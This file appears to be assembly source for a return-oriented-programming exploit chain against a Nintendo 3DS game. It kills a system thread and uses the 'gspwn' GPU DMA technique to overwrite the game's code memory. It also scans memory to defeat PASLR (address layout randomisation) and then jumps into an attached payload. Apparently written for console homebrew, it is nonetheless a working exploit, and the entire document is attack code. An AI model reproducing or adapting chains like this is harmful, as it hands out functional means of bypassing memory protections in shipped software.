.headersize SMD_STACK_COPYTO_ADDR
.org SMD_STACK_COPYTO_ADDR+0x8000

rop:
	.word 0xF00FF00F
	.word 0xF00FF00F
	.word 0xF00FF00F
	.word 0xF00FF00F
	.word 0xF00FF00F
	.word 0xF00FF00F
	.word 0xF00FF00F
	
	; The gsp thread can die in a hole.
	.word ROP_SMD_POP_R0PC
	    .word SMD_SVC_EXITTHREAD
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x0*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x1*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x2*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x3*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x4*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x5*0x4)
	str_r0 SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x6*0x4)
	
	; flush and invalidate out our code area 
	; and code destination before copy later
	flush_dcache SMD_DECOMP_BUFFER + 0x4000, 0x4000
	invalidate_dcache LINEAR_CODEBIN_BUFFER, SMD_CODEBIN_SIZE
	
	;compare appmemtype to N3DS appmemtype (6)
	.word ROP_SMD_POP_R0PC
	    .word SMD_APPMEMTYPE
	cmpne_derefptr_r0addr SMD_APPMEMTYPE_N3DS, (appmemtype_write_skip_after - appmemtype_write_skip)
	
	; if not N3DS, skip
	str_r0 appmemtype_pivot_offset
	.word ROP_SMD_POP_R3_ADD_SPR3_POP_PC
		appmemtype_pivot_offset:
		.word 0x00000000

    ; If we have appmemtype 6 (N3DS default), set variables
    ; accordingly.
	appmemtype_write_skip:
	.word ROP_SMD_POP_R0PC
	    .word SMD_CODE_LINEAR_BASE_N3DS
	str_r0 SMD_GSPWN_CODEBASE
	ldr_add_r0 SMD_SCANLOOP_CURPTR_APPMEMTYPE, (SMD_CODE_LINEAR_BASE_N3DS - SMD_CODE_LINEAR_BASE_O3DS)
	str_r0 SMD_SCANLOOP_CURPTR_APPMEMTYPE
	appmemtype_write_skip_after:
	
	; Copy out our entire codebin to free linear mem and hope nothing
	; screws up
	gspwn_srcderefadd LINEAR_CODEBIN_BUFFER, 0, SMD_GSPWN_CODEBASE, SMD_CODEBIN_SIZE
	sleep 200*1000*1000, 0x00000000
	
	; Init PASLR scan stuff
	str_val SMD_SCANLOOP_CURPTR, LINEAR_CODEBIN_BUFFER - SMD_SCANLOOP_STRIDE + SMD_SCANLOOP_ADD
	
	; Scan for the PASLR shift
scan_loop:
    ; increment ptr
    ldr_add_r0 SMD_SCANLOOP_CURPTR_APPMEMTYPE, SMD_SCANLOOP_STRIDE
	str_r0 SMD_SCANLOOP_CURPTR_APPMEMTYPE
	ldr_add_r0 SMD_SCANLOOP_CURPTR, SMD_SCANLOOP_STRIDE
	str_r0 SMD_SCANLOOP_CURPTR

	; compare *ptr to magic_value
	cmp_derefptr_r0addr SMD_SCANLOOP_MAGICVAL, (scan_loop_pivot_after - scan_loop_pivot)
	
	; if conditional call above returns true, we overwrite scan_loop_pivot_offset with 8 (enough to skip real pivot), and 0 otherwise
	; that way we exit the loop conditionally
	str_r0 scan_loop_pivot_offset

	; this pivot is initially unconditional but we overwrite the offset using conditional value to skip second pivot when we're done
	.word ROP_SMD_POP_R3_ADD_SPR3_POP_PC
		scan_loop_pivot_offset:
		.word 0x00000000
	; this pivot is uncondintional always, it just happens to get skipped at the end
	scan_loop_pivot:
	jump_sp scan_loop
	scan_loop_pivot_after:
	
	gspwn_dstderefadd 0, SMD_SCANLOOP_CURPTR_APPMEMTYPE, SMD_DECOMP_BUFFER + 0x4000, 0x4000
	sleep 200*1000*1000, 0

    ; pass our shift into payload
    ldr_add_r0 SMD_SCANLOOP_CURPTR, 0x100000000 - LINEAR_CODEBIN_BUFFER - SMD_SCANLOOP_ADD
	.word PAYLOAD_VA

	.word 0xDEAF0000
	
	; All of our variables
SMD_SCANLOOP_CURPTR: .word 0xF00FF00F
SMD_SCANLOOP_CURPTR_APPMEMTYPE: .word SMD_CODE_LINEAR_BASE_O3DS - SMD_SCANLOOP_STRIDE
SMD_GSPWN_CODEBASE:  .word SMD_CODE_LINEAR_BASE_O3DS;
	
.headersize 0
.org 0x18000

